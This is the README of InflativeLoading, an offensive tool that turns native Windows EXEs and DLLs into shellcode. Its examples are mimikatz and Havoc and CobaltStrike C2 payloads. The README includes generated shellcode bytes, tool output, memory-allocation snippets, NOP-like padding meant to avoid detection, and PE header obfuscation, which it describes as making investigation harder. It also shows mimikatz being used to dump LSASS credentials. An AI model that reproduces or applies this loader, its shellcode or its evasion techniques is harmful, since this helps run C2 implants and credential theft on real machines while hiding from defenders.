# InflativeLoading
Article: <https://winslow1984.com/books/malware/page/reflectiveloading-and-inflativeloading>

## Major Update History
In this section, major updates are provided. Major updates do include added supports or features.

### 4/11/2024 Added PE Signature Obfuscation
Only a few bytes in the PE header, such as `e_lfanew`, RVA of Import Directory, are essential to complete the loading process. Therefore, other bytes can be overwritten with random ones to hide PE header signatures.

After all the processes are completed, even these bytes will be overwritten for complete obfuscation. For instance, from the screenshot below, we can notice that the PE header is mostly obfuscated, but `e_lfanew` remains unobfuscated for loading purposes. But after the loading process, `e_lfanew` is also obfuscated. 

![image](/screenshot/header_obfuscation.jpg)

**However, depending on the selected program, obfuscation may not be compatible with it. You should know how does the program work. For example, Havoc stateless DLL payload is not compatible with the obfuscation feature because the DLL also makes use of the PE header.**

![image](/screenshot/havocdll.jpg)

Havoc stageless EXE payload works well with obfuscation:

```powershell
PS C:\Users\Administrator\Desktop\dev\inflativeloading> .\DumpPEFromMemory.exe .\havoc.exe havoc.bin
[+] The file is an EXE file
[+] Process PID: 26772
[+] PEB Address:000000E87CB1D000
[+] Image Base Address:00007FF7BB8A0000
[+] e_lfanew is 0x80
[+] Size Of The Image : 0x1e000
[+] Size Of Optional Header : 0xf0
[+] Size Of text Section : 0x18000
[+] Size of other sections of mapped .\havoc.exe is 0x5000

[!] Suggested memory allocations, please adjust accordingly with other memory allocation APIs and languages

// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0x18000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0x18000, 0x5000, 0x3000, 0x20);

[+] 3 iterations are needed

[+] Data successfully written to havoc.bin. Total bytes read: 0x1e000
PS C:\Users\Administrator\Desktop\dev\inflativeloading> python .\InflativeLoading.py -f .\havoc.bin -e true -o true -b havocsc.bin

██╗███╗   ██╗███████╗██╗      █████╗ ████████╗██╗██╗   ██╗███████╗
██║████╗  ██║██╔════╝██║     ██╔══██╗╚══██╔══╝██║██║   ██║██╔════╝
██║██╔██╗ ██║█████╗  ██║     ███████║   ██║   ██║██║   ██║█████╗
██║██║╚██╗██║██╔══╝  ██║     ██╔══██║   ██║   ██║╚██╗ ██╔╝██╔══╝
██║██║ ╚████║██║     ███████╗██║  ██║   ██║   ██║ ╚████╔╝ ███████╗
╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝

    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/InflativeLoading
Twitter: senzee@1984
Website: https://winslow1984.com
Description: Dynamically convert a native PE to PIC shellcode
Attention: Bugs are expected, more support and improvements are coming!



[!] The offset to NT header is 0x80
[!] Depending on the program, obfuscation may not be compatible with it. Make sure you know how does the program work!
[!] Dynamically generated instructions to obfuscate remained PE signatures:
    mov dword ptr [rbx+0x3c], 0x29f7945;
    mov dword ptr [rbx+0xa8], 0x99924859;
    mov dword ptr [rbx+0xb0], 0x99924859;
    mov dword ptr [rbx+0xb4], 0x1203885a;
    mov dword ptr [rbx+0xd0], 0xbc488d5f;
    mov dword ptr [rbx+0x110], 0xbc488d5f;
    mov dword ptr [rbx+0x114], 0x87287f91;
    mov dword ptr [rbx+0x130], 0xbc488d5f;
    mov dword ptr [rbx+0x134], 0xd44cc6bb;
    mov dword ptr [rbx+0x170], 0xbc488d5f;
    mov dword ptr [rbx+0x174], 0x8d976bd1;

[+] Shellcode Stub size: 957 bytes
[+] Generating NOP-like instructions to pad shellcode stub up to 0x1000 bytes
[!] Shellcoded PE's size: 126976 bytes


buf += b"\x48\x83\xe4\xf0\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x20\x48\x83\xc6\x70"
buf += b"\xc6\x06\x0c\xc6\x46\x02\xff\x48\x8b\x76\x08\xc7\x06\x31\x00\x2e\x00\xc7\x46\x04"
buf += b"\x65\x00\x78\x00\xc7\x46\x08\x65\x00\x20\x00\xc6\x46\x0c\x00\x48\x8b\x70\x18\x48"
buf += b"\x8b\x76\x30\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x10\xeb\x66\x41\x8b\x49\x3c\x4d"
buf += b"\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f"
buf += b"\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c"
buf += b"\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb"
buf += b"\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b"
buf += b"\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\x48\x31\xc0\xc3\x4c\x89\xcd"
buf += b"\x41\xb8\x8e\x4e\x0e\xec\xe8\x8c\xff\xff\xff\x49\x89\xc4\x41\xb8\xaa\xfc\x0d\x7c"
buf += b"\xe8\x7e\xff\xff\xff\x49\x89\xc5\xeb\x0a\x48\x31\xc0\x8b\x43\x3c\x48\x01\xd8\xc3"
buf += b"\x48\x31\xf6\x48\x31\xff\x48\x8d\x1d\x17\x0f\x00\x00\xe8\xe4\xff\xff\xff\x8b\xb0"
buf += b"\x90\x00\x00\x00\x48\x01\xde\x8b\xb8\x94\x00\x00\x00\x48\x01\xf7\x48\x39\xfe\x74"
buf += b"\x74\x48\x31\xd2\x8b\x56\x10\x48\x85\xd2\x74\x69\x48\x31\xc9\x8b\x4e\x0c\x48\x01"
buf += b"\xd9\x41\xff\xd4\x48\x31\xd2\x8b\x56\x10\x48\x01\xda\x48\x89\xc1\x49\x89\xd6\x4c"
buf += b"\x89\xf2\x48\x8b\x12\x48\x85\xd2\x74\x3d\x49\xb9\x00\x00\x00\x00\x00\x00\x00\x80"
buf += b"\x4c\x85\xca\x48\x89\xcd\x75\x0c\x48\x01\xda\x48\x83\xc2\x02\x41\xff\xd5\xeb\x10"
buf += b"\x49\xb9\xff\xff\xff\xff\xff\xff\xff\x7f\x4c\x21\xca\x41\xff\xd5\x48\x89\xe9\x4c"
buf += b"\x89\xf2\x48\x89\x02\x49\x83\xc6\x08\xeb\xb8\x48\x83\xc6\x14\xeb\x87\x48\x31\xf6"
buf += b"\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xff\xe8\x45\xff\xff\xff\x8b\xb0\xb0"
......126576 more bytes......


Generated shellcode successfully saved in file havocsc.bin


[#] Shellcode located at address 0x1ae8ab70000

[!] PRESS TO EXECUTE SHELLCODED EXE...
```

### 4/11/2024 Replace padded NOP with NOP-Like instruction sequences
Before the update, `0x90/NOP` instructions are padded after the actual shellcode stub to align a memory page. Many NOPs could be a detection, therefore, InflativeLoading script dynamically selects preset NOP-Like instruction sequences. Users can also add new ones or replace existing ones to achieve better obfuscation.

```python
    nop_like_instructions = [
        {"instruction": [0x90], "length": 1},  # NOP
        {"instruction": [0x86, 0xdb], "length": 2},  # xchg bl, bl;
        {"instruction": [0x66, 0x87, 0xf6], "length": 3},  # xchg si, si;
        {"instruction": [0x48, 0x9c, 0x48, 0x93], "length": 4},  # xchg rax, rbx; xchg rbx, rax;
        {"instruction": [0x66, 0x83, 0xc2, 0x00], "length": 4},  # add dx, 0
        {"instruction": [0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8], "length": 6},  # inc rax; dec rax;
        {"instruction": [0x49, 0xf7, 0xd8, 0x49, 0xf7, 0xd8], "length": 6},  # neg r8; neg r8;
        {"instruction": [0x48, 0x83, 0xc0, 0x01, 0x48, 0xff, 0xc8], "length": 7},  # add rax,0x1; dec rax;
        {"instruction": [0x48, 0x83, 0xe9, 0x2, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc1], "length": 10},  # sub rcx, 2; inc rcx; inc rcx
    ]
```

### 4/11/2024 Improved Shellcode Logic
I added additional shellcode logic to handle some uncommon exceptions. For instance, in the CobaltStrike stateless DLL payload, some base relocation entries are invalid because the page RVA is larger than size of image.

The size of image is `0x58000`.
![image](/screenshot/improved-logic1.jpg)

However, some RVAs are larger than 0x58000.
![image](/screenshot/improved-logic2.jpg)

Besides, the shellcode gracefully exits the program after executing the converted shellcode.


### 4/11/2024 Improved PE Dumper
Now the dumper can display more information and provide suggestions for memory allocation:
```c
// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0x1000, 0x5000, 0x3000, 0x20);
```
The shellcode stub is fixed at `0x1000` bytes, the PE header is fixed at `0x1000` bytes, and the size of the text section and other sections varies.


### 4/11/2024 Added Support For Unmanaged DLL
After the update, unmanaged DLLs can also be converted to PIC shellcode. Test cases for custom DLLs, Havoc stageless DLL payload, and CobaltStrike stageless DLL payload are passed.

```powershell
PS C:\Users\Administrator\Desktop\dev\inflativeloading> .\DumpPEFromMemory.exe .\havocdll.dll havocdll.bin
[+] The file is a DLL file
[+] Image base of mapped .\havocdll.dll is 0x1a730000
[+] e_lfanew of mapped .\havocdll.dll is 0x80
[+] imageSize of mapped .\havocdll.dll is 0x1e000
[+] Size of optinalHeader of mapped .\havocdll.dll is 0xf0
[+] Offset of section Header of mapped .\havocdll.dll is 0x188
[+] Size of text section of mapped .\havocdll.dll is 0x18000
[+] Size of other sections of mapped .\havocdll.dll is 0x5000

[!] Suggested memory allocations, please adjust accordingly with other memory allocation APIs and languages

// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0x18000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0x18000, 0x5000, 0x3000, 0x20);

[+] Data successfully written to havocdll.bin
PS C:\Users\Administrator\Desktop\dev\inflativeloading> python .\InflativeLoading.py -f .\havocdll.bin -e true -o false -b havocdllsc.bin

██╗███╗   ██╗███████╗██╗      █████╗ ████████╗██╗██╗   ██╗███████╗
██║████╗  ██║██╔════╝██║     ██╔══██╗╚══██╔══╝██║██║   ██║██╔════╝
██║██╔██╗ ██║█████╗  ██║     ███████║   ██║   ██║██║   ██║█████╗
██║██║╚██╗██║██╔══╝  ██║     ██╔══██║   ██║   ██║╚██╗ ██╔╝██╔══╝
██║██║ ╚████║██║     ███████╗██║  ██║   ██║   ██║ ╚████╔╝ ███████╗
╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝

    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝

Author: Senzee
Github Repository: https://github.com/senzee1984/InflativeLoading
Twitter: senzee@1984
Website: https://winslow1984.com
Description: Dynamically convert a native PE to PIC shellcode
Attention: Bugs are expected, more support and improvements are coming!



[!] The offset to NT header is 0x80


[+] Shellcode Stub size: 850 bytes
[+] Generating NOP-like instructions to pad shellcode stub up to 0x1000 bytes
[!] Shellcoded PE's size: 126976 bytes


buf += b"\x48\x83\xe4\xf0\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x20\x48\x83\xc6\x70"
buf += b"\xc6\x06\x0c\xc6\x46\x02\xff\x48\x8b\x76\x08\xc7\x06\x31\x00\x2e\x00\xc7\x46\x04"
buf += b"\x65\x00\x78\x00\xc7\x46\x08\x65\x00\x20\x00\xc6\x46\x0c\x00\x48\x8b\x70\x18\x48"
buf += b"\x8b\x76\x30\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x10\xeb\x66\x41\x8b\x49\x3c\x4d"
buf += b"\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f"
buf += b"\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c"
buf += b"\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb"
buf += b"\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b"
buf += b"\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\x48\x31\xc0\xc3\x4c\x89\xcd"
buf += b"\x41\xb8\x8e\x4e\x0e\xec\xe8\x8c\xff\xff\xff\x49\x89\xc4\x41\xb8\xaa\xfc\x0d\x7c"
buf += b"\xe8\x7e\xff\xff\xff\x49\x89\xc5\xeb\x0a\x48\x31\xc0\x8b\x43\x3c\x48\x01\xd8\xc3"
buf += b"\x48\x31\xf6\x48\x31\xff\x48\x8d\x1d\x17\x0f\x00\x00\xe8\xe4\xff\xff\xff\x8b\xb0"
buf += b"\x90\x00\x00\x00\x48\x01\xde\x8b\xb8\x94\x00\x00\x00\x48\x01\xf7\x48\x39\xfe\x74"
buf += b"\x74\x48\x31\xd2\x8b\x56\x10\x48\x85\xd2\x74\x69\x48\x31\xc9\x8b\x4e\x0c\x48\x01"
buf += b"\xd9\x41\xff\xd4\x48\x31\xd2\x8b\x56\x10\x48\x01\xda\x48\x89\xc1\x49\x89\xd6\x4c"
buf += b"\x89\xf2\x48\x8b\x12\x48\x85\xd2\x74\x3d\x49\xb9\x00\x00\x00\x00\x00\x00\x00\x80"
buf += b"\x4c\x85\xca\x48\x89\xcd\x75\x0c\x48\x01\xda\x48\x83\xc2\x02\x41\xff\xd5\xeb\x10"
buf += b"\x49\xb9\xff\xff\xff\xff\xff\xff\xff\x7f\x4c\x21\xca\x41\xff\xd5\x48\x89\xe9\x4c"
buf += b"\x89\xf2\x48\x89\x02\x49\x83\xc6\x08\xeb\xb8\x48\x83\xc6\x14\xeb\x87\x48\x31\xf6"
buf += b"\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xff\xe8\x45\xff\xff\xff\x8b\xb0\xb0"
......126576 more bytes......


Generated shellcode successfully saved in file havocdllsc.bin


[#] Shellcode located at address 0x2108a9d0000

[!] PRESS TO EXECUTE SHELLCODED EXE...
```

![image](/screenshot/callback.jpg)


### 2/19/2024 Added Basic Support For UPX Packed EXE
I slightly modified the code that fixes IAT, because I found some lines of code are unnecessary. After this, InflativeLoading can execute **some UPX packed EXE programs**, including **calc.exe**, **PsExec**. However, only some of packed programs. Firstly, I will not likely test all possible packing configurations for all tested programs. For the second reason, please continue to read:

For programs that do not have `delayed import directory`, InflativeLoading can execute UPX-packed versions of them. However, unlike unpacked programs, packed programs have all ILT empty.

Take normal calc.exe as an example, ILT and IAT are identical for all modules.
![image](/screenshot/calc_pebear.jpg)

But for the UPX packed calc.exe, ILT is empty for all entries in Import Directory.
![image](/screenshot/packed_calc.jpg)

But if the program has delayed import directory, like Mimikatz, it gets more complex.

For the normal mimikatz.exe, the delayed import directory is as follows:
![image](/screenshot/mimikat_pebear.jpg)

But for the UPX packed mimikatz.exe, PE Bear is unable to parse it, so do I.
![image](/screenshot/packed_mimikatz.jpg)

The below is a passed test case for UPX-packed calc.exe.
![image](/screenshot/packed_calc_test.jpg)


## Background
One of my goals is to convert an exe to shellcode. This way, some security tools like Mimikatz can be used with more flexibility. Though some tools like Donut have already achieved this, I still want to create such a tool with my approach, and hopefully, it can bring some improvements.

Motivated and inspired by some classic and modern tools and techniques, InflativeLoading is a tool that can dynamically convert an unmanaged EXE/DLL to PIC shellcode.

**In short, InflativeLoading generates and prepends a shellcode stub to a dumped PE main module.**

The tool consists of `DumpPEFromMemory.exe` and `InflativeLoading.py`.

## Included Components
The following two components are required to convert an unmanaged PE file to shellcode.

### DumpPEFromMemory Project

DumpPEFromMemory.exe is used to get the in-memory version of the selected PE file. 

For `EXE` programs, it works by creating a process in a suspended state and dumping the main module into a binary file (on your dev machine). Why? A typical reflective loading process maps each section of a PE file into a newly allocated memory region. Regarding this, I have two concerns: Firstly, although the data of each section is fundamentally consistent whether it resides on disk or in memory, there might still be certain differences for particular PE files or under specific circumstances. 

```c
// Code snippet from Maldev course
for (int i = 0; i < pPeHdrs->pImgNtHdrs->FileHeader.NumberOfSections; i++) {
	memcpy(
		(PVOID)(pPeBaseAddress + pPeHdrs->pImgSecHdr[i].VirtualAddress),			// Distination: pPeBaseAddress + RVA
		(PVOID)(pPeHdrs->pFileBuffer + pPeHdrs->pImgSecHdr[i].PointerToRawData),		// Source: pPeHdrs->pFileBuffer + RVA
		pPeHdrs->pImgSecHdr[i].SizeOfRawData							// Size
	);
}
```

For `DLL` files, DumPEFromMemory creates a file mapping and maps a view of the file without executing DllMain().


Secondly, the PE file's content already exists in the loader's memory(like a byte array), but the loader allocates memory space again. The execution of DumpPEFromMemory is completed on the operator's dev machine. The operator gets a dump of the PE file when it is loaded in memory. Although some data still requires updates, allocating a memory region on the victim's machine is unnecessary.

In this way, rather than manually map a file, we only need to patch specific data regions like `Import Directory`, `Base Relocation Table Directory`, `Delayed Load Import Descriptors Directory`, etc.

The dumped main module will be saved as a binary file to append to the shellcode stub.

For instance, DumpPEFromMemory executes a classic tool mimikatz, and dumps its main module into a binary file.

```powershell
PS C:\dev\inflativeloading> .\DumpPEFromMemory.exe .\mimikatz.exe mimikatz.bin
[+] The file is an EXE file
[+] Process PID: 23052
[+] PEB Address:00000000004A5000
[+] Image Base Address:00007FF730E00000
[+] e_lfanew is 0x120
[+] Size Of The Image : 0x137000
[+] Size Of Optional Header : 0xf0
[+] Size Of text Section : 0xc5000
[+] Size of other sections of mapped .\mimikatz.exe is 0x71000

[!] Suggested memory allocations, please adjust accordingly with other memory allocation APIs and languages

// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0xc5000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0xc5000, 0x71000, 0x3000, 0x20);

[+] 29 iterations are needed

[+] Data successfully written to mimikatz.bin. Total bytes read: 0x137000
```
![image](/screenshot/dumper-exe.jpg)


And dump Havoc DLL payload from memory:

```powershell
PS C:\dev\inflativeloading> .\DumpPEFromMemory.exe .\havocdll.dll havocdll.bin
[+] The file is a DLL file
[+] Image base of mapped .\havocdll.dll is 0x87fd0000
[+] e_lfanew of mapped .\havocdll.dll is 0x80
[+] imageSize of mapped .\havocdll.dll is 0x1e000
[+] Size of optinalHeader of mapped .\havocdll.dll is 0xf0
[+] Offset of section Header of mapped .\havocdll.dll is 0x188
[+] Size of text section of mapped .\havocdll.dll is 0x18000
[+] Size of other sections of mapped .\havocdll.dll is 0x5000

[!] Suggested memory allocations, please adjust accordingly with other memory allocation APIs and languages

// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0x18000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0x18000, 0x5000, 0x3000, 0x20);

[+] Data successfully written to havocdll.bin
```

![image](/screenshot/dumper-dll-new.jpg)



### InflativeLoading Script
The script dynamically generates a shellcode stub and prepends it to the dump file. 

The shellcode completes the following tasks:
1. Walk PEB and find kernel32.dll
2. Update the command line
3. Parse kernel32.dll to get the address of LoadLibraryA, GetProcAddress function.
4. Locate the appended dump file with an offset
5. Dynamically fix Import Directory, Base Relocation Table Directory, Delayed Load Import Descriptors Directory, etc.
6. Choose to obfuscate the PE header
7. Transfer the execution to the entry point of the PE file.
8. Exit gracefully


For instance, use the script to read previously dumped mimikatz and supply proper command line to dump credentials in LSASS:

![image](/screenshot/logonpasswords.jpg)

Though the shellcode stub should typically be less than 1000 bytes, the script still pads it to 4096 bytes for alignment with the memory page boundary. Then, the operator can easily set proper page permissions for different memory regions. The dumper provides memory allocation suggestion:

```powershell
// Allocate memory with RX permission for shellcode stub
LPVOID buffer = VirtualAlloc(NULL, 0x1000, 0x3000, 0x20);
// Allocate memory with RW permission for PE Header
VirtualAlloc(buffer + 0x1000, 0x1000, 0x3000, 0x04);
// Allocate memory with RX permission for text section
VirtualAlloc(buffer + 0x2000, 0xc5000, 0x3000, 0x20);
// Allocate memory with RW permission for other sections
VirtualAlloc(buffer + 0x2000 + 0xc5000, 0x71000, 0x3000, 0x20);
```


## How To Use?
I believe you already went through both components of InflativeLoading, in summary:

1. Use DumpPEFromMemory.exe to select an unmanaged PE file and dump the PE main module from memory into a bin file. Please refer to the `Best Use Cases` and `Know Issues or Limitations` sections for information on selecting PE files.
2. Use InflativeLoading.py script to prepend a shellcode stub for the dump file. You can choose to provide a command line, obfuscate or not,  and whether to execute the generated shellcode immediately. **Currently, the user-supplied command line only works properly for a small set of programs**.


## Best Use Cases
Because InflativeLoading is in its early stage, not every exe is supported well. Unmanaged DLL is supported well; execution of the export function is coming in the next update!

:white_check_mark: Native console program that does not rely on arguments, like stageless C2 implant, simple custom console program.

:white_check_mark: Native console program with an interactive console/shell, like Mimikatz.

:white_check_mark: Unmanaged DLL

## Improvement Over ReflectiveLoader
:heavy_check_mark: No specific export functions are required, making it more friendly towards PE files for which the source code and compilation are not conveniently accessible

:heavy_check_mark: Avoids unintended results due to differences between the PE file on disk and in memory in certain cases

:heavy_check_mark: Eliminates the need for conversion between the original file offset and RVA

:heavy_check_mark: Avoids additional memory space allocation

:heavy_check_mark: Avoids RWX memory regions.

:heavy_check_mark: Even for RX memory regions, it does not start with the MZ characteristic, increasing the difficulty of investigation.


## Capabilities
:ballot_box_with_check: Support for normal native EXE

:ballot_box_with_check: Support for unmanaged DLL 

:ballot_box_with_check: Support for EXE/DLL that has Delayed Import Directory

:ballot_box_with_check: Fix IAT

:ballot_box_with_check: Fix Base Relocation Directory

:ballot_box_with_check: Tests passed with classic programs like calc, mimikatz, PsExec, etc. 

:ballot_box_with_check: Tests passed with classic C2 payload, such as CobaltStrike and Havoc stageless DLL/EXE payload.

:ballot_box_with_check: Partial support for packed programs.

## Known Issues or Limitations
:warning: Some of the following issues may be fixed in the future, while some of them remain out of scope due to their nature.

+ Supplied command line does not always work properly. **It is a major area that I will be focusing on**.

+ Does not work well for GUI programs, like mspaint.exe. But **calc.exe** works well.

+ Does not work for all the packed programs. Some of the packed programs can be executed well, it is case by case.

+ Does not work for programs that require other dependencies, like custom DLLs.

+ Only support **x64**, and I do not plan to add support for x86 programs.

If you encounter any of the above issues or limitations, the execution of shellcode may crash, the converted program cannot properly identify the command line, or there may be no response.

For instance, PsExec.exe can be converted to PIC shellcode, however, user-supplied command line cannot be identified properly.

```cmd
C:\Users\<...SNIP>\>python InflativeLoading.py -b psexec.bin -c "-s -i powershell" -e true -o psexec_merged.bin

<...SNIP...>

Generated shellcode successfully saved in file psexec_merged.bin

[#] Shellcode located at address 0x27159360000

[!] PRESS TO EXECUTE SHELLCODED EXE...

Python Console v3.12.2 - Python
Copyright  2001-2023 Python Software Foundation. Copyright  2000 BeOpen.com. Copyright  1995-2001 CNRI. Copyright  1991-1995 SMC.
Python Software Foundation

Couldn't install PSEXESVC service:
The specified resource type cannot be found in the image file.
```

## Test Cases
| Program | FORMAT | Has GUI? | Supplied Arguments?| Successful Execution | Execute Properly w Arguments |
| ----------- | ----------- | ----------- |----------- | ----------- |----------- | 
| Simple custom C/C++ programs     | EXE |No | No  |:heavy_check_mark: | N/A |
| Simple custom DLL    | DLL |No | No  |:heavy_check_mark: | N/A |
| Havoc and CobaltStrike EXE Payload     | EXE |No | No  |:heavy_check_mark: | N/A |
| Havoc and CobaltStrike DLL Payload     | DLL |No | No  |:heavy_check_mark: | N/A |
| calc.exe     | EXE | Yes | No |:heavy_check_mark: |N/A |
| mimikatz.exe  | EXE | No | Yes   |:heavy_check_mark: |:heavy_check_mark: |
| PsExec  | EXE | No     |Yes |:heavy_check_mark: |:no_entry_sign:|
| mspaint.exe  | EXE | Yes     |No | :no_entry_sign: |N/A|
| Packed Programs  | EXE | No     |No | Partial|N/A |

Dumped versions of calc.exe and mimikatz.exe can be found in the `bin/` folder of the repository. 


## Improvements In The Future
:bell: The following features and improvements are expected in the future.

+ A separate loader for .NET programs.

+ Add support for DLL export functions.

+ Add support for more packed programs.

+ Improve the shitty code : )

## Acknowledgements and References
The following resources inspired me a lot during my research and development:

<https://github.com/TheWover/donut>

<https://github.com/d35ha/PE2Shellcode>

<https://github.com/hasherezade/pe_to_shellcode>

<https://github.com/monoxgas/sRDI>

<https://github.com/stephenfewer/ReflectiveDLLInjection>

<https://securityintelligence.com/x-force/defining-cobalt-strike-reflective-loader/>

<https://maldevacademy.com/>
